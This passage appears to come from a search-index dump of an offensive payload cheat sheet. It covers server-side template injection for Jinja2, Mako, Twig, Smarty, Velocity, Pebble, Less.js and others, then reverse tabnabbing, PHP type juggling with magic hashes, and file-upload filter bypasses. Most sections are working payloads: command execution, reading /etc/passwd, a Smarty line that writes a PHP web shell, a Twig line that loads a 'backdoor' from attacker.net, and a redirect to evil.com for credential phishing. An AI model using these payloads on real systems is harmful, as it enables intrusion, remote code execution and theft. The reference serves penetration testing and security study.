<pre><code>http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_\nor\nhttp://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_\n</code></pre> <p>Bypassing <code>|join</code></p> <pre><code>http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_\n</code></pre> <p>Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus: <pre><code>{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\n</code></pre></p>"},{"location":"Server%20Side%20Template%20Injection/#jinjava","title":"Jinjava","text":"<p>Official website</p> <p>Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).</p>"},{"location":"Server%20Side%20Template%20Injection/#jinjava-basic-injection","title":"Jinjava - Basic injection","text":"<pre><code>{{'a'.toUpperCase()}} would result in 'A'\n{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206\n</code></pre> <p>Jinjava is an open source project developed by Hubspot, available at https://github.com/HubSpot/jinjava/</p>"},{"location":"Server%20Side%20Template%20Injection/#jinjava-command-execution","title":"Jinjava - Command execution","text":"<p>Fixed by https://github.com/HubSpot/jinjava/pull/230</p> <pre><code>{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#lessjs","title":"Lessjs","text":"<p>Official website</p> <p>Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.</p>"},{"location":"Server%20Side%20Template%20Injection/#lessjs-ssrf-lfi","title":"Lessjs - SSRF / LFI","text":"<pre><code>@import (inline) \"http://localhost\";\n// or\n@import (inline) \"/etc/passwd\";\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#lessjs-v3-command-execution","title":"Lessjs &lt; v3 - Command Execution","text":"<pre><code>body {\ncolor: `global.process.mainModule.require(\"child_process\").execSync(\"id\")`;\n}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#plugins","title":"Plugins","text":"<p>Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.</p> <p><pre><code>// example local plugin usage\n@plugin \"plugin-2.7.js\";\n</code></pre> or <pre><code>// example remote plugin usage\n@plugin \"http://example.com/plugin-2.7.js\"\n</code></pre></p> <p>version 2 example RCE plugin:</p> <p><pre><code>functions.add('cmd', function(val) {\nreturn `\"${global.process.mainModule.require('child_process').execSync(val.value)}\"`;\n});\n</code></pre> version 3 and above example RCE plugin</p> <pre><code>//Vulnerable plugin (3.13.1)\nregisterPlugin({\ninstall: function(less, pluginManager, functions) {\nfunctions.add('cmd', function(val) {\nreturn global.process.mainModule.require('child_process').execSync(val.value).toString();\n});\n}\n})\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#mako","title":"Mako","text":"<p>Official website</p> <p>Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.</p> <pre><code>&lt;%\nimport os\nx=os.popen('id').read()\n%&gt;\n${x}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#direct-access-to-os-from-templatenamespace","title":"Direct access to os from TemplateNamespace:","text":"<p>Any of these payloads allows direct access to the <code>os</code> module</p> <pre><code>${self.module.cache.util.os.system(\"id\")}\n${self.module.runtime.util.os.system(\"id\")}\n${self.template.module.cache.util.os.system(\"id\")}\n${self.module.cache.compat.inspect.os.system(\"id\")}\n${self.__init__.__globals__['util'].os.system('id')}\n${self.template.module.runtime.util.os.system(\"id\")}\n${self.module.filters.compat.inspect.os.system(\"id\")}\n${self.module.runtime.compat.inspect.os.system(\"id\")}\n${self.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.__init__.__globals__['os'].system('id')}\n${self.module.cache.util.compat.inspect.os.system(\"id\")}\n${self.module.runtime.util.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.cache.util.os.system(\"id\")}\n${self.template.module.cache.compat.inspect.os.system(\"id\")}\n${self.module.cache.compat.inspect.linecache.os.system(\"id\")}\n${self.template._mmarker.module.runtime.util.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}\n${self.template.module.filters.compat.inspect.os.system(\"id\")}\n${self.template.module.runtime.compat.inspect.os.system(\"id\")}\n${self.module.filters.compat.inspect.linecache.os.system(\"id\")}\n${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.exceptions.util.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}\n${self.context._with_template.module.cache.util.os.system(\"id\")}\n${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")}\n${self.template.module.cache.util.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.util.os.system(\"id\")}\n${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.util.compat.inspect.os.system(\"id\")}\n${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")}\n${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}\n${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}\n${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}\n${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")}\n${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}\n${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}\n${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}\n${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")}\n${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}\n</code></pre> <p>PoC :</p> <pre><code>&gt;&gt;&gt; print(Template(\"${self.module.cache.util.os}\").render())\n&lt;module 'os' from '/usr/local/lib/python3.10/os.py'&gt;\n</code></pre> <p>Source @podalirius_ : https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/</p>"},{"location":"Server%20Side%20Template%20Injection/#pebble","title":"Pebble","text":"<p>Official website</p> <p>Pebble is a Java templating engine inspired by Twig and similar to the Python Jinja Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.</p>"},{"location":"Server%20Side%20Template%20Injection/#pebble-basic-injection","title":"Pebble - Basic injection","text":"<pre><code>{{ someString.toUPPERCASE() }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#pebble-code-execution","title":"Pebble - Code execution","text":"<p>Old version of Pebble ( &lt; version 3.0.9): <code>{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}</code>.</p> <p>New version of Pebble :</p> <pre><code>{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n.forName('java.lang.Runtime')\n.methods[6]\n.invoke(null,null)\n.exec(cmd)\n.inputStream\n.readAllBytes() %}\n{{ (1).TYPE\n.forName('java.lang.String')\n.constructors[0]\n.newInstance(([bytes]).toArray()) }}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#ruby","title":"Ruby","text":""},{"location":"Server%20Side%20Template%20Injection/#ruby-basic-injections","title":"Ruby - Basic injections","text":"<p>ERB:</p> <pre><code>&lt;%= 7 * 7 %&gt;\n</code></pre> <p>Slim:</p> <pre><code>#{ 7 * 7 }\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#ruby-retrieve-etcpasswd","title":"Ruby - Retrieve /etc/passwd","text":"<pre><code>&lt;%= File.open('/etc/passwd').read %&gt;\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#ruby-list-files-and-directories","title":"Ruby - List files and directories","text":"<pre><code>&lt;%= Dir.entries('/') %&gt;\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#ruby-code-execution","title":"Ruby - Code execution","text":"<p>Execute code using SSTI for ERB engine.</p> <pre><code>&lt;%= system('cat /etc/passwd') %&gt;\n&lt;%= `ls /` %&gt;\n&lt;%= IO.popen('ls /').readlines()  %&gt;\n&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;\n&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;\n</code></pre> <p>Execute code using SSTI for Slim engine.</p> <pre><code>#{ %x|env| }\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#smarty","title":"Smarty","text":"<p>Official website</p> <p>Smarty is a template engine for PHP.</p> <pre><code>{$smarty.version}\n{php}echo `id`;{/php} //deprecated in smarty v3\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"&lt;?php passthru($_GET['cmd']); ?&gt;\",self::clearConfig())}\n{system('ls')} // compatible v3\n{system('cat index.php')} // compatible v3\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#twig","title":"Twig","text":"<p>Official website</p> <p>Twig is a modern template engine for PHP.</p>"},{"location":"Server%20Side%20Template%20Injection/#twig-basic-injection","title":"Twig - Basic injection","text":"<pre><code>{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{dump(_context)}}\n{{app.request.server.all|join(',')}}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#twig-template-format","title":"Twig - Template format","text":"<pre><code>$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#twig-arbitrary-file-reading","title":"Twig - Arbitrary File Reading","text":"<pre><code>\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\n{{include(\"wp-config.php\")}}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#twig-code-execution","title":"Twig - Code execution","text":"<pre><code>{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{[0]|reduce('system','id')}}\n{{['id']|map('system')|join}}\n{{['id',1]|sort('system')|join}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\n</code></pre> <p>Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)</p> <pre><code>FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}\n</code></pre> <p>Example with an email passing FILTER_VALIDATE_EMAIL PHP.</p> <pre><code>POST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#java-velocity","title":"Java - Velocity","text":"<p>Official website</p> <p>Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.</p> <pre><code>#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#java-spring","title":"Java - Spring","text":"<pre><code>*{7*7}\n*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#pattemplate","title":"patTemplate","text":"<p>patTemplate non-compiling PHP templating engine, that uses XML tags to divide a document into different parts</p> <pre><code>&lt;patTemplate:tmpl name=\"page\"&gt;\nThis is the main page.\n  &lt;patTemplate:tmpl name=\"foo\"&gt;\nIt contains another template.\n  &lt;/patTemplate:tmpl&gt;\n&lt;patTemplate:tmpl name=\"hello\"&gt;\nHello {NAME}.&lt;br/&gt;\n&lt;/patTemplate:tmpl&gt;\n&lt;/patTemplate:tmpl&gt;\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#phplib-and-html_template_phplib","title":"PHPlib and HTML_Template_PHPLIB","text":"<p>HTML_Template_PHPLIB is the same as PHPlib but ported to Pear.</p> <p><code>authors.tpl</code></p> <pre><code>&lt;html&gt;\n&lt;head&gt;&lt;title&gt;{PAGE_TITLE}&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;table&gt;\n&lt;caption&gt;Authors&lt;/caption&gt;\n&lt;thead&gt;\n&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tfoot&gt;\n&lt;tr&gt;&lt;td colspan=\"2\"&gt;{NUM_AUTHORS}&lt;/td&gt;&lt;/tr&gt;\n&lt;/tfoot&gt;\n&lt;tbody&gt;\n&lt;!-- BEGIN authorline --&gt;\n&lt;tr&gt;&lt;td&gt;{AUTHOR_NAME}&lt;/td&gt;&lt;td&gt;{AUTHOR_EMAIL}&lt;/td&gt;&lt;/tr&gt;\n&lt;!-- END authorline --&gt;\n&lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p><code>authors.php</code></p> <pre><code>&lt;?php\n//we want to display this author list\n$authors = array(\n'Christian Weiske'  =&gt; 'cweiske@php.net',\n'Bjoern Schotte'     =&gt; 'schotte@mayflower.de'\n);\nrequire_once 'HTML/Template/PHPLIB.php';\n//create template object\n$t =&amp; new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');\n//load file\n$t-&gt;setFile('authors', 'authors.tpl');\n//set block\n$t-&gt;setBlock('authors', 'authorline', 'authorline_ref');\n//set some variables\n$t-&gt;setVar('NUM_AUTHORS', count($authors));\n$t-&gt;setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));\n//display the authors\nforeach ($authors as $name =&gt; $email) {\n$t-&gt;setVar('AUTHOR_NAME', $name);\n$t-&gt;setVar('AUTHOR_EMAIL', $email);\n$t-&gt;parse('authorline_ref', 'authorline', true);\n}\n//finish and echo\necho $t-&gt;finish($t-&gt;parse('OUT', 'authors'));\n?&gt;\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#plates","title":"Plates","text":"<p>Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.</p> <p>controller:</p> <pre><code>// Create new Plates instance\n$templates = new League\\Plates\\Engine('/path/to/templates');\n// Render a template\necho $templates-&gt;render('profile', ['name' =&gt; 'Jonathan']);\n</code></pre> <p>page template:</p> <pre><code>&lt;?php $this-&gt;layout('template', ['title' =&gt; 'User Profile']) ?&gt;\n&lt;h1&gt;User Profile&lt;/h1&gt;\n&lt;p&gt;Hello, &lt;?=$this-&gt;e($name)?&gt;&lt;/p&gt;\n</code></pre> <p>layout template:</p> <pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;&lt;?=$this-&gt;e($title)?&gt;&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n&lt;?=$this-&gt;section('content')?&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Server%20Side%20Template%20Injection/#references","title":"References","text":"<ul> <li>https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/</li> <li>Ruby ERB Template injection - TrustedSec</li> <li>Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)</li> <li>PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax</li> <li>VelocityServlet Expression Language injection</li> <li>Cheatsheet - Flask &amp; Jinja2 SSTI - Sep 3, 2018 \u2022 By phosphore</li> <li>RCE in Hubspot with EL injection in HubL - @fyoorer</li> <li>Jinja2 template injection filter bypasses - @gehaxelt, @0daywork</li> <li>Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018</li> <li>EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018</li> <li>Server Side Template Injection \u2013 on the example of Pebble - MICHA\u0141 BENTKOWSKI | September 17, 2019</li> <li>Server-Side Template Injection (SSTI) in ASP.NET Razor - Cl\u00e9ment Notin - 15 APR 2020</li> <li>Expression Language injection - PortSwigger</li> <li>Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab</li> <li>Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019</li> <li>Handlebars template injection and RCE in a Shopify app </li> <li>Lab: Server-side template injection in an unknown language with a documented exploit</li> <li>Exploiting Less.js to Achieve RCE</li> <li>A Pentester's Guide to Server Side Template Injection (SSTI)</li> <li>Django Templates Server-Side Template Injection</li> <li>#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe</li> <li>Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022</li> <li>Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021</li> <li>Expression Language Injection - OWASP</li> </ul>"},{"location":"Tabnabbing/","title":"Tabnabbing","text":"<p>Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.</p>"},{"location":"Tabnabbing/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>More information about the vulnerability</li> <li>How to exploit</li> <li>How to hunt for it</li> <li>References</li> </ul>"},{"location":"Tabnabbing/#tools","title":"Tools","text":"<ul> <li>Discover Reverse Tabnabbing - Burp Extension</li> </ul>"},{"location":"Tabnabbing/#more-information-about-the-vulnerability","title":"More information about the vulnerability","text":"<p>When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's <code>rel</code> attribute does not contain the value <code>noopener</code> and the target attribute contains the value <code>_blank</code>. If this is the case, the website is vulnerable to tabnabbing.</p>"},{"location":"Tabnabbing/#how-to-exploit","title":"How to exploit","text":"<pre><code>1. Attacker posts a link to a website under his control that contains the following JS code: window.opener.location = \"http://evil.com\"\n2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.\n3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.\n4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example.\n5. The victim tries to log on again and the attacker receives the credentials\n</code></pre>"},{"location":"Tabnabbing/#how-to-hunt-for-it","title":"How to hunt for it","text":"<p>As already mentioned, you have to search for the following link formats: </p> <pre><code>&lt;a href=\"...\" target=\"_blank\" rel=\"\" /&gt;  \nor\n&lt;a href=\"...\" target=\"_blank\" /&gt;\n</code></pre>"},{"location":"Tabnabbing/#references","title":"References","text":"<ul> <li>Reverse Tabnabbing - OWASP, 20.10.20</li> <li>Tabnabbing - Wikipedia, 20.10.20</li> </ul>"},{"location":"Type%20Juggling/","title":"PHP Juggling type and magic hashes","text":"<p>PHP provides two ways to compare two variables:</p> <ul> <li>Loose comparison using <code>== or !=</code> : both variables have \"the same value\".</li> <li>Strict comparison using <code>=== or !==</code> : both variables have \"the same type and the same value\".</li> </ul> <p>PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.</p> <p>PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like <code>0 == strcmp($_GET['username'], $password)</code> bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead. </p>"},{"location":"Type%20Juggling/#type-juggling","title":"Type Juggling","text":""},{"location":"Type%20Juggling/#true-statements","title":"True statements","text":"<pre><code>var_dump('0010e2'   == '1e3');           # true\nvar_dump('0xABCdef' == ' 0xABCdef');     # true PHP 5.0 / false PHP 7.0\nvar_dump('0xABCdef' == '     0xABCdef'); # true PHP 5.0 / false PHP 7.0\nvar_dump('0x01'     == 1)                # true PHP 5.0 / false PHP 7.0\nvar_dump('0x1234Ab' == '1193131');\n</code></pre> <pre><code>'123'  == 123\n'123a' == 123\n'abc'  == 0\n</code></pre> <pre><code>'' == 0 == false == NULL\n'' == 0       # true\n0  == false   # true\nfalse == NULL # true\nNULL == ''    # true\n</code></pre>"},{"location":"Type%20Juggling/#null-statements","title":"NULL statements","text":"<pre><code>var_dump(sha1([])); # NULL\nvar_dump(md5([]));  # NULL\n</code></pre>"},{"location":"Type%20Juggling/#example-vulnerable-code","title":"Example vulnerable code","text":"<pre><code>function validate_cookie($cookie,$key){\n    $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['$expiration'], $key);\n    if($cookie['hmac'] != $hash){ // loose comparison\n        return false;\n    ... \n</code></pre> <p>The <code>$cookie</code> variable is provided by the user. The $key variable is a secret and unknown to the user.</p> <p>If we can make the calculated hash string Zero-like, and provide \"0\" in the <code>$cookie['hmac']</code>, the check will pass.</p> <pre><code>\"0e768261251903820937390661668547\" == \"0\"\n</code></pre> <p>We have control over 3 elements in the cookie: - <code>$username</code> - username you are targeting, probably \"admin\" - <code>$hmac</code> - the provided hash, \"0\" - <code>$expiration</code> - a UNIX timestamp, must be in the future</p> <p>Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC.</p> <pre><code>hash_hmac(admin|1424869663) -&gt; \"e716865d1953e310498068ee39922f49\"\nhash_hmac(admin|1424869664) -&gt; \"8c9a492d316efb5e358ceefe3829bde4\"\nhash_hmac(admin|1424869665) -&gt; \"9f7cdbe744fc2dae1202431c7c66334b\"\nhash_hmac(admin|1424869666) -&gt; \"105c0abe89825a14c471d4f0c1cc20ab\"\n...\nhash_hmac(admin|1835970773) -&gt; \"0e174892301580325162390102935332\" // \"0e174892301580325162390102935332\" == \"0\"\n</code></pre>"},{"location":"Type%20Juggling/#magic-hashes-exploit","title":"Magic Hashes - Exploit","text":"<p>If the hash computed starts with \"0e\" (or \"0..0e\") only followed by numbers, PHP will treat the hash as a float.</p> Hash \"Magic\" Number / String Magic Hash Found By / Description MD4 gH0nAdHk 0e096229559581069251163783434175 @spaze MD4 IiF+hTai 00e90130237707355082822449868597 @spaze MD5 240610708 0e462097431906509019562988736854 @spazef0rze MD5 QNKCDZO 0e830400451993494058024219903391 @spazef0rze MD5 0e1137126905 0e291659922323405260514745084877 @spazef0rze MD5 0e215962017 0e291242476940776845150308577824 @spazef0rze MD5 129581926211651571912466741651878684928 06da5430449f8f6f23dfc1276f722738 Raw: ?T0D??o#??'or'8.N=? SHA1 10932435112 0e07766915004133176347055865026311692244 Independently found by Michael A. Cleverly &amp; Michele Spagnuolo &amp; Rogdham SHA-224 10885164793773 0e281250946775200129471613219196999537878926740638594636 @TihanyiNorbert SHA-256 34250003024812 0e46289032038065916139621039085883773413820991920706299695051332 @TihanyiNorbert SHA-256 TyNOQHUS 0e66298694359207596086558843543959518835691168370379069085300385 @Chick3nman512 <pre><code>&lt;?php\nvar_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)\nvar_dump(md5('aabg7XSs')  == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\n?&gt;\n</code></pre>"},{"location":"Type%20Juggling/#references","title":"References","text":"<ul> <li>Writing Exploits For Exotic Bug Classes: PHP Type Juggling By Tyler Borland</li> <li>Magic Hashes - WhiteHatSec</li> <li>PHP Magic Tricks: Type Juggling</li> <li>spaze/hashes - Magic hashes \u2013 PHP hash \"collisions\"</li> <li>(Super) Magic Hashes - Mon 07 October 2019 - myst404 (@myst404_)</li> </ul>"},{"location":"Upload%20Insecure%20Files/","title":"Upload Insecure Files","text":"<p>Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.</p>"},{"location":"Upload%20Insecure%20Files/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploits<ul> <li>Defaults extensions</li> <li>Upload tricks</li> <li>Filename vulnerabilities</li> <li>Picture compression</li> <li>Configuration Files</li> <li>CVE - Image Tragik</li> <li>CVE - FFMpeg</li> <li>ZIP Archive</li> <li>Jetty RCE</li> </ul> </li> <li>References</li> </ul>"},{"location":"Upload%20Insecure%20Files/#tools","title":"Tools","text":"<ul> <li>Fuxploider</li> <li>Burp &gt; Upload Scanner</li> <li>ZAP &gt; FileUpload AddOn</li> </ul>"},{"location":"Upload%20Insecure%20Files/#exploits","title":"Exploits","text":""},{"location":"Upload%20Insecure%20Files/#defaults-extensions","title":"Defaults extensions","text":"<ul> <li>PHP Server     <pre><code>.php\n.php3\n.php4\n.php5\n.php7\n# Less known PHP extensions\n.pht\n.phps\n.phar\n.phpt\n.pgif\n.phtml\n.phtm\n.inc\n</code></pre></li> <li>ASP Server     <pre><code>.asp\n.aspx\n.config\n.cer and .asa # (IIS &lt;= 7.5)\nshell.aspx;1.jpg # (IIS &lt; 7.0)\nshell.soap\n</code></pre></li> <li>JSP : <code>.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</code>s</li> <li>Perl: <code>.pl, .pm, .cgi, .lib</code></li> <li>Coldfusion: <code>.cfm, .cfml, .cfc, .dbm</code></li> </ul>"},{"location":"Upload%20Insecure%20Files/#upload-tricks","title":"Upload tricks","text":"<ul> <li>Use double extensions : <code>.jpg.php, .png.php5</code></li> <li>Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): <code>.php.jpg</code></li> <li>Random uppercase and lowercase : <code>.pHp, .pHP5, .PhAr</code></li> <li>Null byte (works well against <code>pathinfo()</code>)<ul> <li><code>.php%00.gif</code></li> <li><code>.php\\x00.gif</code></li> <li><code>.php%00.png</code></li> <li><code>.php\\x00.png</code></li> <li><code>.php%00.jpg</code></li> <li><code>.php\\x00.jpg</code></li> </ul> </li> <li>Special characters<ul> <li>Multiple dots : <code>file.php......</code> , in Windows when a file is created with dots at the end those will be removed.</li> <li>Whitespace and new line characters<ul> <li><code>file.php%20</code></li> <li><code>file.php%0d%0a.jpg</code></li> <li><code>file.php%0a</code></li> </ul> </li> <li>Right to Left Override (RTLO): <code>name.%E2%80%AEphp.jpg</code> will became <code>name.gpj.php</code>.</li> <li>Slash: <code>file.php/</code>, <code>file.php.\\</code>, <code>file.j\\sp</code>, <code>file.j/sp</code></li> <li>Multiple special characters: <code>file.jsp/././././.</code></li> </ul> </li> <li>Mime type, change <code>Content-Type : application/x-php</code> or <code>Content-Type : application/octet-stream</code> to <code>Content-Type : image/gif</code><ul> <li><code>Content-Type : image/gif</code></li> <li><code>Content-Type : image/png</code></li> <li><code>Content-Type : image/jpeg</code></li> <li>Content-Type wordlist: SecLists/content-type.txt</li> <li>Set the Content-Type twice: once for unallowed type and once 